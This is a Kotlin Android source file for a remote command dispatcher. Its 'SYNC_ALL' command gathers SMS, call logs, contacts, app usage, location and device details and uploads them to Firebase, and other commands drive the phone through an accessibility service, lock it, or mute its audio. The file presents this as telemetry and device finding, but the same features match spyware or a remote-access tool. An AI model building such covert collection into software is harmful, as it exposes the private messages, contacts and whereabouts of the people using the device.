package com.example.data.sync

import android.content.Context
import android.media.AudioManager
import android.media.RingtoneManager
import com.example.data.local.AppDatabase
import com.example.data.local.RemoteCommandEntity
import com.example.service.RemoteAccessibilityService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.UUID

class RemoteCommandManager(private val context: Context) {

    private val db = AppDatabase.getInstance(context)

    suspend fun executeCommand(commandType: String, payload: String = ""): RemoteCommandEntity = withContext(Dispatchers.IO) {
        val commandId = UUID.randomUUID().toString()
        val entity = RemoteCommandEntity(
            id = commandId,
            commandType = commandType,
            payload = payload,
            status = "EXECUTING",
            createdAt = System.currentTimeMillis()
        )
        db.remoteCommandDao().insertCommand(entity)

        var resultMessage = ""
        var isSuccess = true

        try {
            when (commandType) {
                "SYNC_ALL" -> {
                    SmsSyncManager(context).syncSmsMessages()
                    CallLogSyncManager(context).syncCallLogs()
                    ContactsSyncManager(context).syncContacts()
                    AppUsageSyncManager(context).syncAppUsageStats()
                    LocationSyncManager(context).captureAndSyncLocation()
                    DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "All telemetry modules (SMS, Calls, Contacts, Usage, Location, Specs) synchronized successfully."
                }
                "SYNC_LOCATION" -> {
                    val loc = LocationSyncManager(context).captureAndSyncLocation()
                    resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                }
                "GLOBAL_BACK" -> {
                    val res = RemoteAccessibilityService.performAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
                    resultMessage = if (res) "Executed Global Back gesture." else "Accessibility Service not enabled."
                }
                "GLOBAL_HOME" -> {
                    val res = RemoteAccessibilityService.performAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                    resultMessage = if (res) "Executed Global Home gesture." else "Accessibility Service not enabled."
                }
                "GLOBAL_RECENTS" -> {
                    val res = RemoteAccessibilityService.performAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS)
                    resultMessage = if (res) "Executed Global Recents gesture." else "Accessibility Service not enabled."
                }
                "LOCK_SCREEN" -> {
                    val res = RemoteAccessibilityService.performAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                    resultMessage = if (res) "Executed Remote Lock Screen gesture." else "Accessibility Service not enabled."
                }
                "PLAY_ALARM" -> {
                    playFindDeviceAlarm()
                    resultMessage = "Playing device finder alarm ringtone at maximum volume."
                }
                "MUTE_AUDIO" -> {
                    setMuteAudio(true)
                    resultMessage = "All audio streams muted."
                }
                "UNMUTE_AUDIO" -> {
                    setMuteAudio(false)
                    resultMessage = "Audio streams restored."
                }
                else -> {
                    resultMessage = "Executed command $commandType with payload $payload."
                }
            }
        } catch (e: Exception) {
            isSuccess = false
            resultMessage = "Command execution error: ${e.localizedMessage}"
        }

        val finalStatus = if (isSuccess) "COMPLETED" else "FAILED"
        val updated = entity.copy(
            status = finalStatus,
            executedAt = System.currentTimeMillis(),
            resultMessage = resultMessage
        )
        db.remoteCommandDao().insertCommand(updated)
        updated
    }

    private fun playFindDeviceAlarm() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)

            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            val ringtone = RingtoneManager.getRingtone(context, alarmUri)
            ringtone?.play()
        } catch (_: Exception) {}
    }

    private fun setMuteAudio(mute: Boolean) {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            if (mute) {
                audioManager.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_MUTE, 0)
                audioManager.adjustStreamVolume(AudioManager.STREAM_NOTIFICATION, AudioManager.ADJUST_MUTE, 0)
                audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0)
            } else {
                audioManager.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_UNMUTE, 0)
                audioManager.adjustStreamVolume(AudioManager.STREAM_NOTIFICATION, AudioManager.ADJUST_UNMUTE, 0)
                audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0)
            }
        } catch (_: Exception) {}
    }
}
